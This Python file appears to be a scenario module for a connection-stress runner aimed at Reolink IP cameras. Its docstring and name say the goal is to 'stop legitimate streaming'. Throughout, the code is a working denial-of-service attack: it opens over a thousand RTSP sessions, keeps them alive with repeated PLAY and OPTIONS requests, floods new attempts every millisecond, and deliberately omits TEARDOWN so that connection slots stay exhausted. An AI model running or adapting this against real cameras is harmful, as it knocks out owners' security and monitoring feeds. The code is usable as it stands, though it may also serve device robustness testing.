"""Reolink-specific RTSP scenario."""

try:
    from scenario_imports import (
        RTSPClient,
        make_client,
        close_client,
        options_describe_get_control_url,
    )
except ImportError:
    from .scenario_imports import (
        RTSPClient,
        make_client,
        close_client,
        options_describe_get_control_url,
    )


def scenario_reolink_stop_legitimate_streaming(
    client_id,
    server,
    port,
    path,
    user,
    password,
    timeout,
    duration,
    delay=1,
    wto=2,
):
    """
    REOLINK STOP LEGITIMATE STREAMING scenario.

    PHASE 0:
        - Launch exactly 1016 connection attempts.
        - Each attempt connects and sends OPTIONS once.
        - Count only connections that successfully receive the OPTIONS response.
        - Do not launch replacement attempts.
        - After all attempts have been launched, wait up to 10 seconds for
          successful OPTIONS responses.
        - Continue to Phase 1 even if fewer than 1016 connections succeeded.
        - Print only the final Phase 0 success count.

    PHASE 1:
        - Reuse up to 564 successful Phase 0 connections.
        - Launch reused Phase 0 connections with 0.1 seconds delay.
        - Each reused connection sends OPTIONS/DESCRIBE, SETUP, PLAY.
        - Then sends PLAY every `wto` seconds.
        - If server closes/resets/errors a connection, close that local client
          and continue.

    PHASE 2:
        - Open new connections without a maximum attempt limit.
        - Delay 0.001 seconds between each connection attempt.
        - Keep only a bounded number of Phase 2 attempts in flight at once.
        - Each attempt sends OPTIONS once.
        - Stop Phase 2 as soon as one connection successfully connects and sends
          OPTIONS.
        - The first successful Phase 2 connection is reused in Phase 3.
        - Failed Phase 2 attempts are closed locally.

    PHASE 3:
        - Reuse the successful Phase 2 connection as one Phase 3 connection.
        - Launch a total of 1016 Phase 3 connection attempts, including the
          reused Phase 2 connection when available.
        - Do not launch replacement attempts.
        - Wait indefinitely until all 1016 Phase 3 connections successfully
          receive their first OPTIONS response.
        - Each successful Phase 3 connection sends OPTIONS immediately, then
          every `wto` seconds.

    Important:
        - No RTSP TEARDOWN is sent.
        - A client is closed locally only after the server has closed/reset the
          connection, after a local connection/send error, after duration expiry,
          or if it is an extra/late attempt.
        - If `duration > 0`, the whole scenario ends after that global duration.
    """

    import threading
    import time

    # `client_id` and `delay` are kept in the signature for compatibility with
    # the scenario runner, but this scenario uses fixed per-phase delays.
    _ = client_id
    _ = delay

    scenario_start_time = time.time()
    scenario_stop_event = threading.Event()
    stop_reason = {"printed": False}
    stop_reason_lock = threading.Lock()

    active_clients = []
    failed_clients = []
    closed_clients = []
    all_clients = []
    threads = []

    phase0_clients = []
    phase3_clients = []

    phase2_reused_client = {
        "client": None,
        "phase2_id": None,
    }

    clients_lock = threading.Lock()

    def scenario_duration_expired():
        return duration > 0 and (time.time() - scenario_start_time) >= duration

    def request_scenario_stop(reason=None):
        scenario_stop_event.set()
        if reason:
            with stop_reason_lock:
                if not stop_reason["printed"]:
                    print(reason)
                    stop_reason["printed"] = True

    def check_duration(label):
        if scenario_duration_expired():
            request_scenario_stop(f"{label}: global duration reached; stopping scenario")
            return True
        return False

    def remember_client(client):
        with clients_lock:
            if client not in all_clients:
                all_clients.append(client)

    def mark_active(client):
        with clients_lock:
            if client not in active_clients:
                active_clients.append(client)

    def mark_failed(client):
        with clients_lock:
            if client not in failed_clients:
                failed_clients.append(client)

    def remember_phase0_client(client):
        with clients_lock:
            if client not in phase0_clients:
                phase0_clients.append(client)

    def remember_phase3_client_if_needed(client, target_successes=None):
        with clients_lock:
            if (
                target_successes is not None
                and len(phase3_clients) >= target_successes
            ):
                return False

            if client not in phase3_clients:
                phase3_clients.append(client)

            return True

    def close_and_forget(client, label, error=None):
        """
        Close the local client after the server has closed/reset the connection,
        after a connection/send error, after duration expiry, or for extra/late
        attempts.

        This should NOT send RTSP TEARDOWN. If close_client() sends TEARDOWN
        internally, replace close_client(client) with a raw socket close helper.
        """
        # Uncomment for verbose error logging.
        # if error is not None:
        #     print(f"{label}: connection error/server close detected - {error}")

        try:
            close_client(client)
        except Exception as close_error:
            print(f"{label}: error while closing local client - {close_error}")

        with clients_lock:
            if client in active_clients:
                active_clients.remove(client)

            if client in phase0_clients:
                phase0_clients.remove(client)

            if client in phase3_clients:
                phase3_clients.remove(client)

            if phase2_reused_client["client"] is client:
                phase2_reused_client["client"] = None
                phase2_reused_client["phase2_id"] = None

            if client not in closed_clients:
                closed_clients.append(client)

    def close_all_clients(name):
        with clients_lock:
            clients_to_close = list(active_clients)

        print(f"{name}: closing {len(clients_to_close)} active connections")

        for client in clients_to_close:
            close_and_forget(
                client,
                f"[{name}] Active connection",
            )

    def counts():
        with clients_lock:
            return (
                len(all_clients),
                len(active_clients),
                len(failed_clients),
                len(closed_clients),
                len(phase0_clients),
                len(phase3_clients),
            )

    def phase0_success_count():
        with clients_lock:
            return len(phase0_clients)

    def phase3_success_count():
        with clients_lock:
            return len(phase3_clients)

    def close_non_phase3_clients(name):
        with clients_lock:
            clients_to_close = [
                client
                for client in active_clients
                if client not in phase3_clients
            ]

        print(
            f"{name}: closing {len(clients_to_close)} non-Phase 3 active connections"
        )

        for client in clients_to_close:
            close_and_forget(
                client,
                f"[{name}] Non-Phase 3 connection",
            )

    def make_phase_client(connection_id):
        return make_client(
            RTSPClient,
            connection_id,
            server,
            port,
            path,
            user,
            password,
            timeout,
            udp_ports=False,
        )

    def start_daemon_thread(target, args):
        t = threading.Thread(
            target=target,
            args=args,
            daemon=True,
        )
        t.start()
        threads.append(t)
        return t

    def wait_for_attempt_events(attempt_events, total_timeout):
        """
        Wait for a group of attempt events using one shared deadline.
        This prevents N attempts from waiting N * total_timeout seconds.
        """
        if total_timeout is None:
            for event in attempt_events:
                event.wait()
            return len(attempt_events), 0

        deadline = time.time() + total_timeout
        completed = 0

        for event in attempt_events:
            remaining = deadline - time.time()
            if remaining <= 0:
                break

            if event.wait(timeout=remaining):
                completed += 1

        return completed, len(attempt_events) - completed

    def print_phase_attempt_summary(name, completed, timed_out):
        (
            total_clients,
            active_count,
            failed_count,
            closed_count,
            phase0_count,
            phase3_count,
        ) = counts()

        print(
            f"{name}: phase attempt wait complete. "
            f"completed={completed}, timed_out={timed_out}, "
            f"active={active_count}, failed={failed_count}, "
            f"closed={closed_count}, phase0_available={phase0_count}, "
            f"phase3_available={phase3_count}, "
            f"total_clients={total_clients}"
        )

    def options_loop(
        client,
        label,
        attempt_done_event=None,
        on_first_options_success=None,
        on_attempt_done=None,
    ):
        """
        Sends OPTIONS immediately, then every `wto` seconds.
        Used by Phase 3, including the reused Phase 2 connection.
        """
        options_count = 0
        first_options_success_reported = False
        attempt_done_reported = False
        next_options_time = time.time()

        def report_attempt_done():
            nonlocal attempt_done_reported

            if attempt_done_reported:
                return

            if attempt_done_event is not None:
                attempt_done_event.set()

            if on_attempt_done is not None:
                on_attempt_done()

            attempt_done_reported = True

        while not scenario_stop_event.is_set():
            if check_duration(label):
                if not first_options_success_reported:
                    report_attempt_done()
                close_and_forget(client, label)
                return

            current_time = time.time()

            if current_time >= next_options_time:
                try:
                    options_count += 1
                    client.send_options()

                    if not first_options_success_reported:
                        if on_first_options_success is not None:
                            first_success_result = on_first_options_success()

                            if first_success_result is False:
                                report_attempt_done()
                                close_and_forget(client, label)
                                return

                        report_attempt_done()
                        first_options_success_reported = True

                    next_options_time = current_time + wto

                except Exception as e:
                    if not first_options_success_reported:
                        report_attempt_done()

                    close_and_forget(client, label, e)
                    return

            time.sleep(0.1)

        if not first_options_success_reported:
            report_attempt_done()
        close_and_forget(client, label)

    def play_loop(client, label, attempt_done_event=None):
        """
        Sends PLAY every `wto` seconds on an already SETUP/PLAYed connection.
        Used by Phase 1.
        """
        if attempt_done_event is not None:
            attempt_done_event.set()

        play_count = 1
        next_play_time = time.time() + wto

        while not scenario_stop_event.is_set():
            if check_duration(label):
                close_and_forget(client, label)
                return

            current_time = time.time()

            if current_time >= next_play_time:
                try:
                    play_count += 1
                    client.send_play()
                    next_play_time = current_time + wto

                except Exception as e:
                    close_and_forget(client, label, e)
                    return

            time.sleep(0.1)

        close_and_forget(client, label)

    # =========================
    # PHASE 0
    # =========================

    def open_phase0_connection(
        phase0_id,
        attempt_done_event,
        phase0_accepting_event,
    ):
        client = make_phase_client(phase0_id)
        remember_client(client)

        try:
            if scenario_stop_event.is_set():
                attempt_done_event.set()
                return

            client.connect()
            mark_active(client)

            try:
                client.send_options()
            except Exception as e:
                attempt_done_event.set()
                close_and_forget(
                    client,
                    f"[PHASE 0] Connection {phase0_id}",
                    e,
                )
                return

            if phase0_accepting_event.is_set() and not scenario_stop_event.is_set():
                remember_phase0_client(client)
            else:
                close_and_forget(
                    client,
                    f"[PHASE 0] Connection {phase0_id} late successful connection",
                )

            attempt_done_event.set()
            return

        except Exception as e:
            mark_failed(client)
            attempt_done_event.set()

            close_and_forget(
                client,
                f"[PHASE 0] Connection {phase0_id}",
                e,
            )
            return

    def open_phase0_connection_with_slot(
        phase0_id,
        attempt_done_event,
        phase0_accepting_event,
        phase0_attempt_slot,
        phase0_attempt_condition,
        phase0_attempt_counts,
    ):
        try:
            open_phase0_connection(
                phase0_id,
                attempt_done_event,
                phase0_accepting_event,
            )
        finally:
            with phase0_attempt_condition:
                phase0_attempt_counts["in_flight"] -= 1
                phase0_attempt_counts["completed"] += 1
                phase0_attempt_condition.notify_all()

            phase0_attempt_slot.release()

    def launch_phase0_fixed_attempts(
        name="PHASE 0",
        total_attempts=1016,
        inter_connection_delay=0.001,
        post_launch_wait=10,
        max_in_flight=100,
    ):
        print(
            f"{name}: launching exactly {total_attempts} connection attempts "
            f"(max_in_flight={max_in_flight})..."
        )

        phase0_accepting_event = threading.Event()
        phase0_accepting_event.set()

        phase0_attempt_slot = threading.BoundedSemaphore(max_in_flight)
        phase0_attempt_condition = threading.Condition()
        phase0_attempt_counts = {
            "in_flight": 0,
            "completed": 0,
        }

        launched = 0

        for phase0_id in range(total_attempts):
            if check_duration(name) or scenario_stop_event.is_set():
                break

            while not scenario_stop_event.is_set():
                if phase0_attempt_slot.acquire(timeout=inter_connection_delay):
                    break
                check_duration(name)

            if scenario_stop_event.is_set():
                break

            attempt_done_event = threading.Event()

            with phase0_attempt_condition:
                phase0_attempt_counts["in_flight"] += 1

            try:
                start_daemon_thread(
                    open_phase0_connection_with_slot,
                    (
                        phase0_id,
                        attempt_done_event,
                        phase0_accepting_event,
                        phase0_attempt_slot,
                        phase0_attempt_condition,
                        phase0_attempt_counts,
                    ),
                )
            except RuntimeError as e:
                attempt_done_event.set()
                with phase0_attempt_condition:
                    phase0_attempt_counts["in_flight"] -= 1
                    phase0_attempt_counts["completed"] += 1
                    phase0_attempt_condition.notify_all()

                phase0_attempt_slot.release()
                print(f"{name}: could not start attempt {phase0_id}: {e}")
                time.sleep(inter_connection_delay)
                continue

            launched += 1
            time.sleep(inter_connection_delay)

        wait_deadline = time.time() + post_launch_wait

        with phase0_attempt_condition:
            while phase0_success_count() < total_attempts:
                if scenario_stop_event.is_set():
                    break

                remaining_wait = wait_deadline - time.time()
                if remaining_wait <= 0:
                    break

                phase0_attempt_condition.wait(timeout=remaining_wait)

        # Stop accepting late Phase 0 successes after the 10-second window.
        phase0_accepting_event.clear()

        with phase0_attempt_condition:
            completed = phase0_attempt_counts["completed"]
            timed_out = phase0_attempt_counts["in_flight"]

        print(
            f"{name}: successfully opened {phase0_success_count()}/{total_attempts}"
        )
        print_phase_attempt_summary(name, completed, timed_out)

    # =========================
    # PHASE 1: reuse Phase 0
    # =========================

    def run_phase1_on_existing_client(client, phase1_id, attempt_done_event):
        label = f"[PHASE 1] Reused Phase 0 connection {phase1_id}"

        try:
            if scenario_stop_event.is_set():
                attempt_done_event.set()
                return

            control_url = options_describe_get_control_url(client)
            client.send_setup(control_url, transport_mode="NO_PORTS")
            client.send_play()

            play_loop(
                client,
                label,
                attempt_done_event,
            )

        except Exception as e:
            mark_failed(client)
            attempt_done_event.set()

            close_and_forget(
                client,
                label,
                e,
            )
            return

    def launch_phase1_using_phase0_clients(
        name="PHASE 1",
        total=564,
        inter_connection_delay=0.1,
        per_attempt_timeout=60,
    ):
        with clients_lock:
            reusable_clients = list(phase0_clients[:total])

        print(
            f"{name}: reusing {len(reusable_clients)} Phase 0 connections "
            f"out of requested {total}"
        )

        attempt_events = []

        for i, client in enumerate(reusable_clients):
            if check_duration(name) or scenario_stop_event.is_set():
                break

            attempt_done_event = threading.Event()
            attempt_events.append(attempt_done_event)

            start_daemon_thread(
                run_phase1_on_existing_client,
                (client, i, attempt_done_event),
            )

            time.sleep(inter_connection_delay)

        completed, timed_out = wait_for_attempt_events(
            attempt_events,
            per_attempt_timeout,
        )

        print(
            f"{name}: phase attempt wait complete. "
            f"completed={completed}, timed_out={timed_out}"
        )

    # =========================
    # PHASE 2
    # =========================

    def open_phase2_connection(
        phase2_id,
        attempt_done_event,
        phase2_success_event,
        phase2_attempt_timeout=None,
    ):
        if phase2_success_event.is_set() or scenario_stop_event.is_set():
            attempt_done_event.set()
            return

        client = make_phase_client(phase2_id)

        if phase2_attempt_timeout is not None:
            client.timeout = phase2_attempt_timeout

        try:
            if phase2_success_event.is_set() or scenario_stop_event.is_set():
                attempt_done_event.set()
                return

            client.connect()
            remember_client(client)
            mark_active(client)

            if phase2_success_event.is_set() or scenario_stop_event.is_set():
                close_and_forget(
                    client,
                    f"[PHASE 2] Connection {phase2_id} opened after success/stop",
                )
                attempt_done_event.set()
                return

            try:
                client.send_options()
            except Exception as e:
                close_and_forget(
                    client,
                    f"[PHASE 2] Connection {phase2_id}",
                    e,
                )
                attempt_done_event.set()
                return

            selected_for_reuse = False

            with clients_lock:
                if phase2_reused_client["client"] is None:
                    phase2_reused_client["client"] = client
                    phase2_reused_client["phase2_id"] = phase2_id
                    selected_for_reuse = True
                    phase2_success_event.set()

            if selected_for_reuse:
                attempt_done_event.set()
                # Do not park and do not close. The connection will be handled
                # by Phase 3 options_loop().
                return

            close_and_forget(
                client,
                f"[PHASE 2] Connection {phase2_id} extra successful connection",
            )
            attempt_done_event.set()
            return

        except Exception as e:
            attempt_done_event.set()

            close_and_forget(
                client,
                f"[PHASE 2] Connection {phase2_id}",
                e,
            )
            return

    def open_phase2_connection_with_slot(
        phase2_id,
        attempt_done_event,
        phase2_success_event,
        phase2_attempt_slot,
        phase2_attempt_timeout,
        phase2_attempt_condition,
        phase2_attempt_counts,
    ):
        try:
            open_phase2_connection(
                phase2_id,
                attempt_done_event,
                phase2_success_event,
                phase2_attempt_timeout,
            )
        finally:
            with phase2_attempt_condition:
                phase2_attempt_counts["in_flight"] -= 1
                phase2_attempt_counts["completed"] += 1
                phase2_attempt_condition.notify_all()

            phase2_attempt_slot.release()

    # =========================
    # PHASE 3
    # =========================

    def open_phase3_connection(
        phase3_id,
        attempt_done_event,
        phase3_target_successes=None,
        on_attempt_done=None,
        phase3_attempt_timeout=None,
    ):
        if scenario_stop_event.is_set():
            attempt_done_event.set()
            if on_attempt_done is not None:
                on_attempt_done()
            return

        client = make_phase_client(phase3_id)

        if phase3_attempt_timeout is not None:
            client.timeout = phase3_attempt_timeout

        remember_client(client)

        try:
            client.connect()
            mark_active(client)

            options_loop(
                client,
                f"[PHASE 3] Connection {phase3_id}",
                attempt_done_event,
                lambda: remember_phase3_client_if_needed(
                    client,
                    phase3_target_successes,
                ),
                on_attempt_done,
            )

        except Exception as e:
            mark_failed(client)
            attempt_done_event.set()
            if on_attempt_done is not None:
                on_attempt_done()

            close_and_forget(
                client,
                f"[PHASE 3] Connection {phase3_id}",
                e,
            )
            return

    def run_phase3_on_existing_client(
        client,
        phase3_id,
        attempt_done_event,
        phase3_target_successes=None,
        on_attempt_done=None,
    ):
        options_loop(
            client,
            f"[PHASE 3] Reused Phase 2 connection {phase3_id}",
            attempt_done_event,
            lambda: remember_phase3_client_if_needed(
                client,
                phase3_target_successes,
            ),
            on_attempt_done,
        )

    # =========================
    # LAUNCHERS
    # =========================

    def launch_phase2_until_success(
        name="PHASE 2",
        inter_connection_delay=0.001,
        per_attempt_timeout=60,
        max_in_flight=100,
        phase2_attempt_timeout=1,
    ):
        print(
            f"{name}: launching connection attempts every "
            f"{inter_connection_delay} seconds until one succeeds "
            f"(max_in_flight={max_in_flight}, "
            f"attempt_timeout={phase2_attempt_timeout})..."
        )

        phase2_success_event = threading.Event()
        phase2_attempt_slot = threading.BoundedSemaphore(max_in_flight)
        phase2_attempt_condition = threading.Condition()
        phase2_attempt_counts = {
            "in_flight": 0,
            "completed": 0,
        }

        launched = 0

        while not phase2_success_event.is_set() and not scenario_stop_event.is_set():
            check_duration(name)
            if scenario_stop_event.is_set():
                break

            if not phase2_attempt_slot.acquire(timeout=inter_connection_delay):
                continue

            attempt_done_event = threading.Event()

            with phase2_attempt_condition:
                phase2_attempt_counts["in_flight"] += 1

            try:
                start_daemon_thread(
                    open_phase2_connection_with_slot,
                    (
                        launched,
                        attempt_done_event,
                        phase2_success_event,
                        phase2_attempt_slot,
                        phase2_attempt_timeout,
                        phase2_attempt_condition,
                        phase2_attempt_counts,
                    ),
                )
            except RuntimeError as e:
                attempt_done_event.set()
                with phase2_attempt_condition:
                    phase2_attempt_counts["in_flight"] -= 1
                    phase2_attempt_counts["completed"] += 1
                    phase2_attempt_condition.notify_all()

                phase2_attempt_slot.release()
                print(f"{name}: could not start attempt {launched}: {e}")
                time.sleep(inter_connection_delay)
                continue

            launched += 1

            # Wait up to the configured delay. If this attempt succeeds quickly,
            # Phase 2 stops immediately and Phase 3 can start.
            if phase2_success_event.wait(timeout=inter_connection_delay):
                break

        print(
            f"{name}: stopped launching. "
            f"launched={launched}, success={phase2_success_event.is_set()}"
        )

        phase2_wait_deadline = None
        if per_attempt_timeout is not None:
            phase2_wait_deadline = time.time() + per_attempt_timeout

        with phase2_attempt_condition:
            while phase2_attempt_counts["in_flight"] > 0:
                if phase2_wait_deadline is None:
                    phase2_attempt_condition.wait(timeout=1)
                    check_duration(name)
                    if scenario_stop_event.is_set():
                        break
                    continue

                remaining_wait = phase2_wait_deadline - time.time()
                if remaining_wait <= 0:
                    break

                phase2_attempt_condition.wait(timeout=remaining_wait)

            completed = phase2_attempt_counts["completed"]
            timed_out = phase2_attempt_counts["in_flight"]

        print_phase_attempt_summary(name, completed, timed_out)

    def launch_phase3_with_reused_phase2_client(
        name="PHASE 3",
        total=1016,
        inter_connection_delay=0.001,
        max_in_flight=100,
        phase3_attempt_timeout=None,
    ):
        reused_client = phase2_reused_client["client"]
        phase3_attempt_slot = threading.BoundedSemaphore(max_in_flight)
        phase3_attempt_condition = threading.Condition()
        phase3_attempt_counts = {
            "in_flight": 0,
            "completed": 0,
        }

        def make_phase3_attempt_done():
            attempt_done_reported = False

            def mark_phase3_attempt_done():
                nonlocal attempt_done_reported

                with phase3_attempt_condition:
                    if attempt_done_reported:
                        return

                    attempt_done_reported = True
                    phase3_attempt_counts["in_flight"] -= 1
                    phase3_attempt_counts["completed"] += 1
                    phase3_attempt_condition.notify_all()

                phase3_attempt_slot.release()

            return mark_phase3_attempt_done

        def reserve_phase3_attempt_slot():
            while not scenario_stop_event.is_set():
                if phase3_attempt_slot.acquire(timeout=inter_connection_delay):
                    with phase3_attempt_condition:
                        phase3_attempt_counts["in_flight"] += 1
                    return True
                check_duration(name)
            return False

        if reused_client is None:
            print(
                f"{name}: no successful Phase 2 connection to reuse; "
                f"launching {total} Phase 3 attempts"
            )
            next_phase3_id = 0
            launched = 0
        else:
            print(
                f"{name}: reusing successful Phase 2 connection "
                f"{phase2_reused_client['phase2_id']} as one Phase 3 connection"
            )

            next_phase3_id = 1
            launched = 1

            if reserve_phase3_attempt_slot():
                reused_attempt_done_event = threading.Event()
                reused_attempt_done = make_phase3_attempt_done()

                try:
                    start_daemon_thread(
                        run_phase3_on_existing_client,
                        (
                            reused_client,
                            0,
                            reused_attempt_done_event,
                            total,
                            reused_attempt_done,
                        ),
                    )
                except RuntimeError as e:
                    reused_attempt_done_event.set()
                    reused_attempt_done()
                    print(f"{name}: could not start reused Phase 2 attempt: {e}")
                    launched = 0

        print(
            f"{name}: launching exactly {total} total Phase 3 attempts "
            f"including any reused Phase 2 connection "
            f"(max_in_flight={max_in_flight}, "
            f"attempt_timeout={phase3_attempt_timeout})..."
        )

        while launched < total and not scenario_stop_event.is_set():
            check_duration(name)
            if scenario_stop_event.is_set():
                break

            if not reserve_phase3_attempt_slot():
                break

            attempt_done_event = threading.Event()
            attempt_done = make_phase3_attempt_done()

            try:
                start_daemon_thread(
                    open_phase3_connection,
                    (
                        next_phase3_id,
                        attempt_done_event,
                        total,
                        attempt_done,
                        phase3_attempt_timeout,
                    ),
                )
            except RuntimeError as e:
                attempt_done_event.set()
                attempt_done()
                print(f"{name}: could not start attempt {next_phase3_id}: {e}")
                time.sleep(inter_connection_delay)
                continue

            launched += 1
            next_phase3_id += 1
            time.sleep(inter_connection_delay)

        print(
            f"{name}: launched={launched}/{total}. "
            f"Waiting until {total} Phase 3 connections receive OPTIONS responses."
        )

        while phase3_success_count() < total and not scenario_stop_event.is_set():
            check_duration(name)
            if scenario_stop_event.is_set():
                break
            time.sleep(1)

        with phase3_attempt_condition:
            completed = phase3_attempt_counts["completed"]
            timed_out = phase3_attempt_counts["in_flight"]

        print(
            f"{name}: stopped waiting. "
            f"launched={launched}, target_successes={total}, "
            f"success={phase3_success_count()}"
        )
        print_phase_attempt_summary(name, completed, timed_out)
        print(f"{name}: successfully opened {phase3_success_count()}/{total}")

    # ========== PHASE 0 ==========
    launch_phase0_fixed_attempts(
        name="PHASE 0",
        total_attempts=1016,
        inter_connection_delay=0.001,
        post_launch_wait=10,
        max_in_flight=100,
    )

    # ========== PHASE 1 ==========
    if not scenario_stop_event.is_set():
        launch_phase1_using_phase0_clients(
            name="PHASE 1",
            total=564,
            inter_connection_delay=0.1,
            per_attempt_timeout=60,
        )

    # ========== PHASE 2 ==========
    if not scenario_stop_event.is_set():
        launch_phase2_until_success(
            name="PHASE 2",
            inter_connection_delay=0.001,
            per_attempt_timeout=60,
            max_in_flight=100,
            phase2_attempt_timeout=1,
        )

    # ========== PHASE 3 ==========
    if not scenario_stop_event.is_set():
        launch_phase3_with_reused_phase2_client(
            name="PHASE 3",
            total=1016,
            inter_connection_delay=0.001,
            max_in_flight=100,
            phase3_attempt_timeout=None,
        )

    if not scenario_stop_event.is_set():
        close_non_phase3_clients("FINAL CLEANUP")

    print("All phases launched.")

    try:
        while not scenario_stop_event.is_set():
            if check_duration("Monitor"):
                break

            time.sleep(10)

            (
                total_clients,
                active_count,
                failed_count,
                closed_count,
                phase0_count,
                phase3_count,
            ) = counts()

            print(
                f"Monitor: active={active_count}, "
                f"failed={failed_count}, "
                f"closed={closed_count}, "
                f"phase0_available={phase0_count}, "
                f"phase3_available={phase3_count}, "
                f"total_clients={total_clients}"
            )

    except KeyboardInterrupt:
        request_scenario_stop("Interrupted by user.")

    finally:
        request_scenario_stop()
        close_all_clients("FINAL CLEANUP")

        (
            total_clients,
            active_count,
            failed_count,
            closed_count,
            phase0_count,
            phase3_count,
        ) = counts()

        print(
            f"Final summary: active={active_count}, "
            f"failed={failed_count}, "
            f"closed={closed_count}, "
            f"phase0_available={phase0_count}, "
            f"phase3_available={phase3_count}, "
            f"total_clients={total_clients}"
        )
